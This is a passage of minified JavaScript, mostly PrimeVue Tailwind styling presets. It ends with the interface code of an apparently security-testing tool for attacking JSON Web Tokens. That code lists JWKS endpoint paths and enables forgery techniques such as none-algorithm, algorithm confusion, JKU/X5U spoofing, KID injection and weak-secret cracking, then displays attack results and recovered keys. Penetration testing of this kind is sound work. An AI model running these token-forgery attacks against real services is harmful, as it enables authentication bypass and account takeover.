      "p-3",
      "bg-surface-700",
      "text-white",
      "leading-none",
      "rounded-md",
      "whitespace-pre-line",
      "break-words",
      "shadow-md"
    ]
  }
}, Nd = {
  root: {
    class: [
      // Space
      "p-4",
      // Shape
      "rounded-md",
      "border-none",
      // Color
      "bg-surface-0 dark:bg-surface-900",
      "text-surface-700 dark:text-white/80",
      "[&_[data-pc-name=pcfilter]]:w-full"
    ]
  },
  wrapper: {
    class: ["overflow-auto"]
  },
  container: {
    class: [
      // Spacing
      "m-0 p-0",
      // Misc
      "list-none overflow-auto"
    ]
  },
  node: {
    class: [
      "p-0 my-[2px] mx-0 first:mt-0",
      "rounded-md",
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-inset focus:ring-primary-500 dark:focus:ring-primary-400 focus:z-10"
    ]
  },
  nodeContent: ({ context: e, props: t }) => ({
    class: [
      // Flex and Alignment
      "flex items-center",
      // Shape
      "rounded-md",
      // Spacing
      "py-1 px-2 gap-2",
      // Colors
      e.selected ? "bg-highlight text-highlight-contrast " : "bg-transparent text-surface-600 dark:text-white/70",
      // States
      {
        "hover:bg-surface-50 dark:hover:bg-[rgba(255,255,255,0.03)]": (t.selectionMode == "single" || t.selectionMode == "multiple") && !e.selected
      },
      // Transition
      "transition-shadow duration-200",
      {
        "cursor-pointer select-none": t.selectionMode == "single" || t.selectionMode == "multiple"
      }
    ]
  }),
  nodeToggleButton: ({ context: e }) => ({
    class: [
      // Flex and Alignment
      "inline-flex items-center justify-center",
      // Shape
      "border-0 rounded-full",
      // Size
      "w-7 h-7",
      // Colors
      "bg-transparent",
      {
        "text-surface-600 dark:text-white/70": !e.selected,
        "text-highlight-contrast": e.selected,
        invisible: e.leaf
      },
      // States
      "hover:bg-surface-200/20 dark:hover:bg-surface-500/20",
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400",
      // Transition
      "transition duration-200",
      // Misc
      "cursor-pointer select-none"
    ]
  }),
  nodeIcon: ({ context: e }) => ({
    class: [
      // Space
      "mr-2",
      // Color
      {
        "text-surface-600 dark:text-white/70": !e.selected,
        "text-highlight-contrast": e.selected
      }
    ]
  }),
  nodeLabel: ({ context: e }) => ({
    class: [
      {
        "text-surface-600 dark:text-white/70": !e.selected,
        "text-highlight-contrast": e.selected
      }
    ]
  }),
  nodeChildren: {
    class: ["m-0 list-none p-0 pl-4 [&:not(ul)]:pl-0 [&:not(ul)]:my-[2px]"]
  },
  loadingIcon: {
    class: [
      "text-surface-500 dark:text-surface-0/70",
      "absolute top-[50%] right-[50%] -mt-2 -mr-2 animate-spin"
    ]
  }
}, Md = {
  root: ({ props: e, state: t }) => ({
    class: [
      // Display and Position
      "inline-flex",
      "relative",
      // Shape
      "rounded-md",
      // Color and Background
      { "bg-surface-0 dark:bg-surface-950": !e.disabled },
      "border",
      { "border-surface-300 dark:border-surface-700": !e.invalid },
      // Invalid State
      "invalid:focus:ring-red-200",
      "invalid:hover:border-red-500",
      { "border-red-500 dark:border-red-400": e.invalid },
      // Transitions
      "transition-all",
      "duration-200",
      // States
      {
        "hover:border-surface-400 dark:hover:border-surface-600": !e.invalid
      },
      {
        "outline-none outline-offset-0 ring-1 ring-primary-500 dark:ring-primary-400 z-10": t.focused
      },
      // Misc
      "cursor-pointer",
      "select-none",
      {
        "bg-surface-200 dark:bg-surface-700 select-none pointer-events-none cursor-default": e.disabled
      }
    ]
  }),
  labelContainer: {
    class: ["overflow-hidden flex flex-auto cursor-pointer"]
  },
  label: ({ props: e, parent: t }) => {
    var r, o, s, n;
    return {
      class: [
        "block leading-[normal]",
        // Space
        "py-2 px-3",
        // Color
        "text-surface-800 dark:text-white/80",
        {
          "placeholder:text-transparent dark:placeholder:text-transparent": ((r = t.instance) == null ? void 0 : r.$name) == "FloatLabel",
          "!text-transparent dark:!text-transparent": ((o = t.instance) == null ? void 0 : o.$name) == "FloatLabel" && e.modelValue == null || ((s = e.modelValue) == null ? void 0 : s.length) == 0
        },
        // Filled State *for FloatLabel
        {
          filled: ((n = t.instance) == null ? void 0 : n.$name) == "FloatLabel" && e.modelValue !== null
        },
        // Transition
        "transition duration-200",
        // Misc
        "overflow-hidden whitespace-nowrap cursor-pointer overflow-ellipsis"
      ]
    };
  },
  dropdown: {
    class: [
      // Flexbox
      "flex items-center justify-center",
      "shrink-0",
      // Color and Background
      "bg-transparent",
      "text-surface-500",
      // Size
      "w-12",
      // Shape
      "rounded-r-md"
    ]
  },
  panel: {
    class: [
      // Colors
      "bg-surface-0 dark:bg-surface-900",
      "text-surface-700 dark:text-white/80",
      // Shape
      "border border-surface-300 dark:border-surface-700",
      "rounded-md",
      "shadow-md"
    ]
  },
  treeContainer: {
    class: [
      // Sizing
      "max-h-[200px]",
      // Misc
      "overflow-auto"
    ]
  },
  transition: {
    enterFromClass: "opacity-0 scale-y-[0.8]",
    enterActiveClass: "transition-[transform,opacity] duration-[120ms] ease-[cubic-bezier(0,0,0.2,1)]",
    leaveActiveClass: "transition-opacity duration-100 ease-linear",
    leaveToClass: "opacity-0"
  }
}, Fd = {
  root: ({ props: e }) => ({
    class: [
      "relative",
      {
        "flex flex-col h-full": e.scrollHeight === "flex"
      }
    ]
  }),
  mask: {
    class: [
      // Position
      "absolute",
      "top-0 left-0",
      "z-20",
      // Flex & Alignment
      "flex items-center justify-center",
      // Size
      "w-full h-full",
      // Color
      "bg-surface-100/40 dark:bg-surface-800/40",
      // Transition
      "transition duration-200"
    ]
  },
  loadingIcon: {
    class: "w-8 h-8 animate-spin"
  },
  tableContainer: ({ props: e }) => ({
    class: [
      // Overflow
      {
        "relative overflow-auto": e.scrollable,
        "overflow-x-auto": e.resizableColumns
      }
    ]
  }),
  header: ({ props: e }) => ({
    class: [
      "font-semibold",
      // Shape
      e.showGridlines ? "border-x border-t border-b-0" : "border-y border-x-0",
      // Spacing
      "p-4",
      // Color
      "bg-surface-0 dark:bg-surface-900",
      "border-surface-200 dark:border-surface-700",
      "text-surface-700 dark:text-white/80"
    ]
  }),
  footer: {
    class: [
      "font-semibold",
      // Shape
      "border-t-0 border-b border-x-0",
      // Spacing
      "p-4",
      // Color
      "bg-surface-0 dark:bg-surface-900",
      "border-surface-200 dark:border-surface-700",
      "text-surface-700 dark:text-white/80"
    ]
  },
  table: {
    class: [
      // Table & Width
      "border-collapse table-fixed w-full "
    ]
  },
  thead: ({ props: e }) => ({
    class: [
      // Position & Z-index
      {
        "top-0 z-40 sticky": e.scrollable
      }
    ]
  }),
  tbody: ({ props: e }) => ({
    class: [
      // Block Display
      {
        block: e.scrollable
      },
      "dark:bg-surface-800"
    ]
  }),
  tfoot: ({ props: e }) => ({
    class: [
      // Block Display
      {
        block: e.scrollable
      }
    ]
  }),
  headerRow: ({ props: e }) => ({
    class: [
      // Flexbox & Width
      {
        "flex flex-nowrap w-full": e.scrollable
      }
    ]
  }),
  row: ({ context: e, props: t }) => ({
    class: [
      // Flex
      { "flex flex-nowrap w-full": e.scrollable },
      // Color
      "text-surface-700 dark:text-white/80",
      {
        "dark:bg-white/30 dark:odd:bg-white/30 dark:hover:bg-white/25 dark:odd:hover:bg-white/30": e.selected
      },
      {
        "bg-surface-0 text-surface-600 dark:bg-surface-800 dark:odd:bg-surface-700/30": !e.selected
      },
      // Border
      "border-surface-200 dark:border-surface-900",
      "border-b last:border-transparent focus:border-transparent",
      // Hover & Flexbox
      {
        "hover:bg-surface-100 dark:hover:bg-surface-900": e.selectable && !e.selected
      },
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 ring-inset dark:focus:ring-white/80"
    ]
  }),
  headerCell: ({ context: e, props: t }) => ({
    class: [
      "font-semibold",
      "leading-[normal]",
      // Position
      {
        "sticky z-40": e.scrollable && e.scrollDirection === "both" && e.frozen
      },
      // Flex & Alignment
      {
        "flex flex-1 items-center": e.scrollable,
        "flex-initial shrink-0": e.scrollable && e.scrollDirection === "both" && !e.frozen
      },
      "text-left",
      // Shape
      { "first:border-l border-y border-r": e == null ? void 0 : e.showGridlines },
      "border-0 border-b border-solid",
      // Spacing
      (e == null ? void 0 : e.size) === "small" ? "py-0.5 px-2" : (e == null ? void 0 : e.size) === "large" ? "py-[0.9375rem] px-5" : "py-3 px-4",
      // Color
      (t.sortable === "" || t.sortable) && e.sorted ? "bg-highlight" : "bg-surface-0 text-surface-700 dark:text-white/80 dark:bg-surface-900",
      "border-surface-200 dark:border-surface-700",
      // States
      {
        "hover:bg-surface-100 dark:hover:bg-surface-80/50": (t.sortable === "" || t.sortable) && !(e != null && e.sorted)
      },
      "focus-visible:outline-none focus-visible:outline-offset-0 focus-visible:ring-1 focus-visible:ring-inset focus-visible:ring-primary-500 dark:focus-visible:ring-primary-400",
      // Transition
      { "transition duration-200": t.sortable === "" || t.sortable },
      // Misc
      {
        "overflow-hidden relative bg-clip-padding": e.resizable && !e.frozen
      }
    ]
  }),
  column: {
    headerCell: ({ context: e, props: t }) => ({
      class: [
        "font-semibold",
        "leading-[normal]",
        // Position
        {
          "sticky z-40": e.scrollable && e.scrollDirection === "both" && e.frozen
        },
        // Flex & Alignment
        {
          "flex flex-1 items-center": e.scrollable,
          "flex-initial shrink-0": e.scrollable && e.scrollDirection === "both" && !e.frozen
        },
        "text-left",
        // Shape
        { "first:border-l border-y border-r": e == null ? void 0 : e.showGridlines },
        "border-0 border-b border-solid",
        // Spacing
        (e == null ? void 0 : e.size) === "small" ? "py-0.5 px-2" : (e == null ? void 0 : e.size) === "large" ? "py-[0.9375rem] px-5" : "py-3 px-4",
        // Color
        (t.sortable === "" || t.sortable) && e.sorted ? "bg-highlight" : "bg-surface-0 text-surface-700 dark:text-white/80 dark:bg-surface-900",
        "border-surface-200 dark:border-surface-700",
        // States
        {
          "hover:bg-surface-100 dark:hover:bg-surface-80/50": (t.sortable === "" || t.sortable) && !(e != null && e.sorted)
        },
        "focus-visible:outline-none focus-visible:outline-offset-0 focus-visible:ring-1 focus-visible:ring-inset focus-visible:ring-primary-500 dark:focus-visible:ring-primary-400",
        // Transition
        { "transition duration-200": t.sortable === "" || t.sortable },
        // Misc
        {
          "overflow-hidden relative bg-clip-padding": e.resizable && !e.frozen
        }
      ]
    }),
    bodyCell: ({ context: e }) => ({
      class: [
        // Font
        "leading-[normal]",
        // Position
        {
          sticky: e.scrollable && e.scrollDirection === "both" && e.frozen
        },
        // Flex & Alignment
        {
          "flex flex-1 items-center": e.scrollable,
          "flex-initial shrink-0": e.scrollable && e.scrollDirection === "both" && !e.frozen
        },
        "text-left",
        // Shape
        "border-surface-200 dark:border-surface-700",
        {
          "border-x-0 border-l-0": !e.showGridlines
        },
        { "first:border-l border-r border-b": e == null ? void 0 : e.showGridlines },
        // Right block
        "first:relative first:before:absolute first:before:inset-0 first:before:w-1",
        { "first:before:bg-secondary-400": e.selected },
        // Spacing
        (e == null ? void 0 : e.size) === "small" ? "py-0.5 px-2" : (e == null ? void 0 : e.size) === "large" ? "py-[0.9375rem] px-5" : "py-3 px-4",
        // Misc
        {
          "cursor-pointer": e.selectable,
          sticky: e.scrollable && e.scrollDirection === "both" && e.frozen,
          "border-x-0 border-l-0": !e.showGridlines
        }
      ]
    }),
    bodyCellContent: "flex items-center gap-2",
    rowToggleIcon: ({ context: e }) => ({
      class: [
        // Size
        (e == null ? void 0 : e.size) === "small" ? "size-[.6rem]" : (e == null ? void 0 : e.size) === "large" ? "size-4" : "size-[.8rem]"
      ]
    }),
    nodeToggleButton: ({ context: e }) => ({
      class: [
        "relative",
        // Flex & Alignment
        "inline-flex items-center justify-center",
        "text-left align-middle",
        // Spacing
        "m-0 mr-2 p-0",
        // Size
        e.size === "small" ? "size-5" : e.size === "large" ? "size-7" : "size-6",
        // Shape
        "border-0 rounded-md",
        // Color
        "text-surface-700 dark:text-white/70",
        "border-transparent",
        // States
        "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-white/80 dark:focus:ring-white/80",
        "hover:text-surface-200 hover:bg-surface-50 dark:hover:bg-surface-700/50",
        // Transition
        "transition duration-200",
        // Misc
        "overflow-hidden",
        "cursor-pointer select-none"
      ]
    }),
    sortIcon: ({ context: e }) => ({
      class: [
        "ml-2 inline-block",
        e.sorted ? "text-inherit" : "fill-surface-700 dark:fill-white/70"
      ]
    }),
    columnResizer: {
      class: [
        "block",
        // Position
        "absolute top-0 right-0",
        // Sizing
        "w-2 h-full",
        // Spacing
        "m-0 p-0",
        // Color
        "border border-transparent",
        // Misc
        "cursor-col-resize"
      ]
    },
    transition: {
      enterFromClass: "opacity-0 scale-y-[0.8]",
      enterActiveClass: "transition-[transform,opacity] duration-[120ms] ease-[cubic-bezier(0,0,0.2,1)]",
      leaveActiveClass: "transition-opacity duration-100 ease-linear",
      leaveToClass: "opacity-0"
    }
  },
  columnResizeIndicator: {
    class: "absolute hidden w-[2px] z-20 bg-primary"
  }
}, Dd = {
  global: Pu,
  directives: {
    badge: nu,
    ripple: nd,
    tooltip: Ld
  },
  //forms
  autocomplete: tu,
  select: Qs,
  dropdown: Qs,
  inputnumber: Lu,
  inputtext: Mu,
  datepicker: qs,
  calendar: qs,
  checkbox: pu,
  radiobutton: od,
  toggleswitch: Zs,
  inputswitch: Zs,
  selectbutton: ld,
  slider: ud,
  rating: sd,
  multiselect: Ju,
  togglebutton: zd,
  cascadeselect: fu,
  listbox: Du,
  colorpicker: gu,
  inputgroup: Iu,
  inputgroupaddon: zu,
  inputmask: Ru,
  knob: Fu,
  treeselect: Md,
  textarea: Od,
  password: Zu,
  iconfield: Ou,
  floatlabel: Tu,
  inputotp: Nu,
  //buttons
  button: lu,
  buttongroup: cu,
  splitbutton: fd,
  speeddial: dd,
  //data
  paginator: Yu,
  datatable: vu,
  tree: Nd,
  dataview: yu,
  organizationchart: Gu,
  orderlist: Uu,
  picklist: ed,
  treetable: Fd,
  timeline: Ed,
  //panels
  accordion: Xc,
  accordionpanel: eu,
  accordionheader: Zc,
  accordioncontent: Qc,
  panel: Xu,
  fieldset: Cu,
  card: uu,
  tabview: Td,
  divider: _u,
  toolbar: Rd,
  scrollpanel: ad,
  splitter: pd,
  splitterpanel: bd,
  stepper: vd,
  steplist: md,
  step: gd,
  stepitem: hd,
  steppanels: xd,
  deferred: ku,
  tab: kd,
  tabs: jd,
  tablist: wd,
  tabpanels: Cd,
  tabpanel: Sd,
  //file
  fileupload: ju,
  //menu
  contextmenu: xu,
  menu: Bu,
  menubar: Ku,
  steps: yd,
  tieredmenu: Ad,
  breadcrumb: iu,
  panelmenu: Qu,
  megamenu: Vu,
  dock: Su,
  tabmenu: _d,
  //overlays
  dialog: wu,
  popover: Xs,
  sidebar: Xs,
  drawer: Ys,
  overlaypanel: Ys,
  confirmpopup: mu,
  confirmdialog: hu,
  //messages
  message: Hu,
  toast: Id,
  //media
  carousel: du,
  galleria: $u,
  image: Au,
  //misc
  badge: su,
  overlaybadge: qu,
  avatar: ru,
  avatargroup: ou,
  tag: $d,
  chip: bu,
  progressbar: td,
  skeleton: cd,
  scrolltop: id,
  terminal: Pd,
  blockui: au,
  metergroup: Wu,
  inplace: Eu,
  progressspinner: rd
}, Sa = /* @__PURE__ */ ba("attacks", () => {
  const e = ue([]), t = ue(null), r = Ve(
    () => e.value.find((g) => g.sessionId === t.value) ?? e.value[0] ?? null
  );
  function o(g, h, b = 0) {
    const C = e.value.find((R) => R.sessionId === g);
    if (C) {
      b > 0 && (C.total = b);
      return;
    }
    const I = {
      sessionId: g,
      requestId: h,
      startedAt: Date.now(),
      results: [],
      total: b,
      complete: !1,
      errors: [],
      recoveredKeys: [],
      discoveredEndpoints: [],
      keyRecoveryLog: []
    };
    e.value.unshift(I), t.value = g;
  }
  function s(g, h) {
    const b = e.value.find((C) => C.sessionId === g);
    b && (b.total = h);
  }
  function n(g, h) {
    const b = e.value.find((C) => C.sessionId === g);
    b && b.results.push(h);
  }
  function i(g, h) {
    const b = e.value.find((C) => C.sessionId === g);
    b && (b.complete = !0, b.errors.push(...h));
  }
  function a(g, h) {
    const b = e.value.find((C) => C.sessionId === g);
    b && !b.recoveredKeys.includes(h) && b.recoveredKeys.push(h);
  }
  function l(g, h) {
    const b = e.value.find((C) => C.sessionId === g);
    b && b.keyRecoveryLog.push(h);
  }
  function u(g, h) {
    const b = e.value.find((C) => C.sessionId === g);
    b && !b.discoveredEndpoints.some((C) => C.url === h.url) && b.discoveredEndpoints.push(h);
  }
  function c(g, h, b) {
    const C = e.value.find((I) => I.sessionId === g);
    C && (C.jwksJson = h, C.jwksPrivateKey = b);
  }
  function p(g) {
    t.value = g;
  }
  function m() {
    e.value = [], t.value = null;
  }
  return {
    sessions: e,
    activeSessionId: t,
    activeSession: r,
    startSession: o,
    setSessionTotal: s,
    addResult: n,
    completeSession: i,
    addRecoveredKey: a,
    logKeyRecovery: l,
    addDiscoveredEndpoint: u,
    setJWKSPayload: c,
    setActiveSession: p,
    clearSessions: m
  };
}), Vd = [
  "/.well-known/jwks.json",
  "/.well-known/openid-configuration",
  "/oauth/jwks",
  "/oauth2/jwks",
  "/oauth2/v1/keys",
  "/oauth2/v3/certs",
  "/v1/keys",
  "/v2/keys",
  "/.well-known/keys",
  "/auth/keys",
  "/auth/realms/master/protocol/openid-connect/certs",
  "/realms/master/protocol/openid-connect/certs",
  "/jwks",
  "/jwks.json",
  "/api/auth/jwks",
  "/api/jwks",
  "/api/v1/jwks",
  "/api/v2/jwks",
  "/.well-known/pki-validation/jwks.json",
  "/common/discovery/keys",
  "/discovery/v2.0/keys",
  "/oauth2/default/v1/keys",
  "/api/auth/keys",
  "/oauth/v2/keys",
  "/auth/jwks",
  "/.well-known/jwt-keys",
  "/api/v1/jwks.json",
  "/connect/jwks_uri"
], Hr = {
  jwksUrl: "",
  customPublicKeyPem: "",
  customPrivateKeyPem: "",
  customCertPem: "",
  jwksPaths: [...Vd],
  customWordlist: [],
  enableKeyRecovery: !1,
  enabledAttacks: {
    none: !0,
    nullSig: !0,
    algConfusion: !0,
    embeddedJwk: !0,
    jkuSpoof: !0,
    x5uSpoof: !0,
    kidInject: !0,
    claimTamper: !0,
    weakSecret: !0
  }
}, Bd = {
  none: "None Algorithm",
  nullSig: "Null Signature",
  algConfusion: "Algorithm Confusion",
  embeddedJwk: "Embedded JWK",
  jkuSpoof: "JKU Spoofing",
  x5uSpoof: "X5U Spoofing",
  kidInject: "KID Injection",
  claimTamper: "Claim Tampering",
  weakSecret: "Weak Secret"
};
function Ca(e) {
  return e ? e < 300 ? "text-green-400" : e < 400 ? "text-yellow-400" : e < 500 ? "text-orange-400" : "text-red-400" : "text-gray-400";
}
function ja(e) {
  return {
    baseline: "bg-gray-600 text-gray-100",
    none: "bg-red-900 text-red-200",
    nullSig: "bg-red-900 text-red-200",
    algConfusion: "bg-orange-900 text-orange-200",
    embeddedJwk: "bg-yellow-900 text-yellow-200",
    jkuSpoof: "bg-purple-900 text-purple-200",
    x5uSpoof: "bg-purple-900 text-purple-200",
    kidInject: "bg-blue-900 text-blue-200",
    claimTamper: "bg-teal-900 text-teal-200",
    weakSecret: "bg-pink-900 text-pink-200"
  }[e] ?? "bg-gray-700 text-gray-200";
}
const Kd = { class: "h-full flex flex-col overflow-hidden" }, Hd = { class: "px-3 py-2 border-b border-gray-700 bg-gray-900 flex items-center gap-2" }, Wd = ["value"], Jd = ["value"], Ud = {
  key: 1,
  class: "text-xs text-gray-400 flex-1"
}, Gd = {
  key: 0,
  class: "ml-1 text-yellow-400 animate-pulse"
}, qd = {
  key: 1,
  class: "ml-1 text-green-400"
}, Yd = {
  key: 2,
  class: "ml-2 text-cyan-400"
}, Xd = {
  key: 0,
  class: "px-3 py-2 bg-cyan-950 border-b-2 border-cyan-600 text-xs text-cyan-200"
}, Qd = { class: "font-semibold mb-1" }, Zd = ["onClick"], ef = { class: "text-cyan-400" }, tf = {
  key: 0,
  class: "text-cyan-500"
}, rf = {
  key: 1,
  class: "h-1 bg-gray-800"
}, of = {
  key: 2,
  class: "px-3 py-1.5 bg-red-950 border-b border-red-800 text-xs text-red-300 max-h-28 overflow-y-auto"
}, sf = { class: "font-semibold mb-0.5" }, nf = {
  key: 3,
  class: "px-3 py-1.5 bg-yellow-950 border-b border-yellow-800 text-xs text-yellow-300 max-h-16 overflow-y-auto"
}, af = {
  key: 4,
  class: "px-3 py-1.5 bg-green-950 border-b border-green-800 text-xs text-green-300"
}, lf = { class: "flex gap-1 px-2 py-1.5 border-b border-gray-700 overflow-x-auto shrink-0" }, cf = ["onClick"], uf = { class: "flex-1 overflow-y-auto" }, df = {
  key: 0,
  class: "flex items-center justify-center h-full text-gray-500 text-sm py-8"
}, ff = ["onClick"], pf = { class: "flex items-center gap-2 min-w-0" }, bf = { class: "text-xs text-gray-200 truncate flex-1" }, gf = {
  key: 1,
  class: "text-xs text-red-500 shrink-0"
}, hf = {
  key: 2,
  class: "text-xs text-gray-600 shrink-0 animate-pulse"
}, mf = { class: "text-xs text-gray-500 mt-0.5 truncate pl-0.5" }, xf = /* @__PURE__ */ vr({
  __name: "AttackList",
  props: {
    selectedId: {},
    selectedEndpointUrl: {}
  },
  emits: ["select", "selectEndpoint", "showJwks"],
  setup(e, { emit: t }) {
    const r = t, o = Sa(), s = ue("all"), n = Ve(() => o.activeSession), i = Ve(() => {
      var g;
      const l = ((g = n.value) == null ? void 0 : g.results) ?? [], u = l.filter((h) => h.responseStatus && h.responseStatus < 300).length, c = l.filter((h) => h.responseStatus && h.responseStatus >= 400 && h.responseStatus < 500).length, p = l.filter((h) => h.responseStatus && h.responseStatus >= 500).length, m = l.filter((h) => h.error).length;
      return [
        { key: "all", label: "All", count: l.length },
        { key: "2xx", label: "2xx", count: u },
        { key: "4xx", label: "4xx", count: c },
        { key: "5xx", label: "5xx", count: p },
        { key: "err", label: "Errors", count: m }
      ];
    }), a = Ve(() => {
      var u;
      const l = ((u = n.value) == null ? void 0 : u.results) ?? [];
      switch (s.value) {
        case "2xx":
          return l.filter((c) => c.responseStatus && c.responseStatus < 300);
        case "4xx":
          return l.filter((c) => c.responseStatus && c.responseStatus >= 400 && c.responseStatus < 500);
        case "5xx":
          return l.filter((c) => c.responseStatus && c.responseStatus >= 500);
        case "err":
          return l.filter((c) => c.error);
        default:
          return l;
      }
    });
    return (l, u) => {
      var c, p, m, g, h;
      return P(), A("div", Kd, [
        L(" Session selector + progress bar "),
        x("div", Hd, [
          Ae(o).sessions.length > 1 ? (P(), A("select", {
            key: 0,
            value: Ae(o).activeSessionId,
            onChange: u[0] || (u[0] = (b) => Ae(o).setActiveSession(b.target.value)),
            class: "text-xs bg-gray-800 border border-gray-600 rounded px-2 py-1 text-gray-300 flex-1 min-w-0"
          }, [
            (P(!0), A(
              ne,
              null,
              Me(Ae(o).sessions, (b) => (P(), A("option", {
                key: b.sessionId,
                value: b.sessionId
              }, " Session " + E(b.sessionId.slice(0, 6)) + " — " + E(b.results.length) + "/" + E(b.total) + " (" + E(new Date(b.startedAt).toLocaleTimeString()) + ") ", 9, Jd))),
              128
              /* KEYED_FRAGMENT */
            ))
          ], 40, Wd)) : (P(), A("span", Ud, [
            n.value ? (P(), A(
              ne,
              { key: 0 },
              [
                ze(
                  E(n.value.results.length) + "/" + E(n.value.total) + " attacks ",
                  1
                  /* TEXT */
                ),
                n.value.complete ? (P(), A("span", qd, "✓ complete")) : (P(), A("span", Gd, "running…")),
                n.value.discoveredEndpoints.length ? (P(), A(
                  "span",
                  Yd,
                  "🔎 " + E(n.value.discoveredEndpoints.length) + " key endpoint(s)",
                  1
                  /* TEXT */
                )) : L("v-if", !0)
              ],
              64
              /* STABLE_FRAGMENT */
            )) : (P(), A(
              ne,
              { key: 1 },
              [
                ze("No active session")
              ],
              64
              /* STABLE_FRAGMENT */
            ))
          ])),
          Ae(o).sessions.length ? (P(), A("button", {
            key: 2,
            onClick: u[1] || (u[1] = (b) => Ae(o).clearSessions()),
            class: "text-xs text-gray-500 hover:text-red-400 transition-colors"
          }, "Clear")) : L("v-if", !0)
        ]),
        L(" Discovered JWKS / key endpoints — highlighted so the analyst can't miss it "),
        (c = n.value) != null && c.discoveredEndpoints.length ? (P(), A("div", Xd, [
          x(
            "p",
            Qd,
            "🔎 " + E(n.value.discoveredEndpoints.length) + " key endpoint(s) discovered — click for details:",
            1
            /* TEXT */
          ),
          (P(!0), A(
            ne,
            null,
            Me(n.value.discoveredEndpoints, (b, C) => (P(), A("div", {
              key: C,
              onClick: (I) => r("selectEndpoint", b),
              class: De([
                "font-mono break-all leading-snug px-1 -mx-1 rounded cursor-pointer hover:bg-cyan-900 transition-colors",
                e.selectedEndpointUrl === b.url ? "bg-cyan-900 ring-1 ring-cyan-500" : ""
              ])
            }, [
              x(
                "span",
                ef,
                "[" + E(b.source) + "]",
                1
                /* TEXT */
              ),
              ze(
                " " + E(b.url) + " ",
                1
                /* TEXT */
              ),
              b.keyCount ? (P(), A(
                "span",
                tf,
                "— " + E(b.keyCount) + " key(s)",
                1
                /* TEXT */
              )) : L("v-if", !0)
            ], 10, Zd))),
            128
            /* KEYED_FRAGMENT */
          ))
        ])) : L("v-if", !0),
        L(" Progress bar "),
        n.value && !n.value.complete ? (P(), A("div", rf, [
          x(
            "div",
            {
              class: "h-1 bg-blue-500 transition-all duration-300",
              style: qr({ width: n.value.total ? `${n.value.results.length / n.value.total * 100}%` : "0%" })
            },
            null,
            4
            /* STYLE */
          )
        ])) : L("v-if", !0),
        L(" Errors / warnings "),
        (p = n.value) != null && p.errors.length ? (P(), A("div", of, [
          x(
            "p",
            sf,
            "⚠ " + E(n.value.errors.length) + " error(s):",
            1
            /* TEXT */
          ),
          (P(!0), A(
            ne,
            null,
            Me(n.value.errors, (b, C) => (P(), A(
              "p",
              {
                key: C,
                class: "font-mono break-all"
              },
              E(b),
              1
              /* TEXT */
            ))),
            128
            /* KEYED_FRAGMENT */
          ))
        ])) : L("v-if", !0),
        L(" Key recovery log "),
        (m = n.value) != null && m.keyRecoveryLog.length ? (P(), A("div", nf, [
          (P(!0), A(
            ne,
            null,
            Me(n.value.keyRecoveryLog, (b, C) => (P(), A(
              "p",
              { key: C },
              E(b),
              1
              /* TEXT */
            ))),
            128
            /* KEYED_FRAGMENT */
          ))
        ])) : L("v-if", !0),
        L(" Recovered keys notice "),
        (g = n.value) != null && g.recoveredKeys.length ? (P(), A(
          "div",
          af,
          " ✓ Recovered " + E(n.value.recoveredKeys.length) + " public key(s) from HTTP history ",
          1
          /* TEXT */
        )) : L("v-if", !0),
        L(" JWKS info "),
        (h = n.value) != null && h.jwksJson ? (P(), A("div", {
          key: 5,
          class: "px-3 py-1.5 bg-purple-950 border-b border-purple-800 text-xs text-purple-300 cursor-pointer hover:bg-purple-900",
          onClick: u[2] || (u[2] = (b) => r("showJwks", n.value))
        }, " ℹ JKU/X5U spoofing — click to view JWKS payload to host ")) : L("v-if", !0),
        L(" Filter tabs "),
        x("div", lf, [
          (P(!0), A(
            ne,
            null,
            Me(i.value, (b) => (P(), A("button", {
              key: b.key,
              onClick: (C) => s.value = b.key,
              class: De([
                "px-2 py-0.5 rounded text-xs font-medium transition-colors whitespace-nowrap",
                s.value === b.key ? "bg-blue-700 text-white" : "text-gray-400 hover:text-gray-200 hover:bg-gray-700"
              ])
            }, E(b.label) + " (" + E(b.count) + ") ", 11, cf))),
            128
            /* KEYED_FRAGMENT */
          ))
        ]),
        L(" Results list "),
        x("div", uf, [
          !n.value || a.value.length === 0 ? (P(), A("div", df, [
            n.value ? (P(), A(
              ne,
              { key: 1 },
              [
                ze("No results yet…")
              ],
              64
              /* STABLE_FRAGMENT */
            )) : (P(), A(
              ne,
              { key: 0 },
              [
                ze('Right-click a request with a JWT and select "Attack JWT"')
              ],
              64
              /* STABLE_FRAGMENT */
            ))
          ])) : L("v-if", !0),
          (P(!0), A(
            ne,
            null,
            Me(a.value, (b) => (P(), A("div", {
              key: b.id,
              onClick: (C) => r("select", b),
              class: De([
                "px-3 py-2 border-b border-gray-800 cursor-pointer hover:bg-gray-800 transition-colors",
                e.selectedId === b.id ? "bg-gray-800 border-l-2 border-l-blue-500" : ""
              ])
            }, [
              x("div", pf, [
                x(
                  "span",
                  {
                    class: De(["px-1.5 py-0.5 rounded text-xs font-mono shrink-0", Ae(ja)(b.technique)])
                  },
                  E(b.technique),
                  3
                  /* TEXT, CLASS */
                ),
                x(
                  "span",
                  bf,
                  E(b.techniqueName),
                  1
                  /* TEXT */
                ),
                b.responseStatus ? (P(), A(
                  "span",
                  {
                    key: 0,
                    class: De(["text-xs font-mono font-bold shrink-0", Ae(Ca)(b.responseStatus)])
                  },
                  E(b.responseStatus),
                  3
                  /* TEXT, CLASS */
                )) : b.error ? (P(), A("span", gf, "ERR")) : (P(), A("span", hf, "…"))
              ]),
              x(
                "p",
                mf,
                E(b.description.slice(0, 80)),
                1
                /* TEXT */
              )
            ], 10, ff))),
            128
            /* KEYED_FRAGMENT */
          ))
        ])
      ]);
    };
  }
});
function xo(e) {
  const t = e + "=".repeat((4 - e.length % 4) % 4);
  return atob(t.replace(/-/g, "+").replace(/_/g, "/"));
}
const vf = {
  key: 0,
  class: "h-full flex flex-col overflow-hidden text-sm"
}, yf = { class: "px-4 py-3 border-b border-gray-700 bg-gray-900 flex items-start gap-3" }, kf = { class: "flex-1 min-w-0" }, wf = { class: "font-semibold text-gray-100 truncate" }, _f = { class: "text-gray-400 text-xs mt-0.5 leading-relaxed" }, Sf = { class: "flex-1 overflow-y-auto" }, Cf = { class: "px-4 py-2 border-b border-gray-700 flex gap-6 text-xs" }, jf = {
  key: 1,
  class: "text-gray-400"
}, Tf = {
  key: 2,
  class: "text-gray-400"
}, $f = {
  key: 3,
  class: "text-red-400"
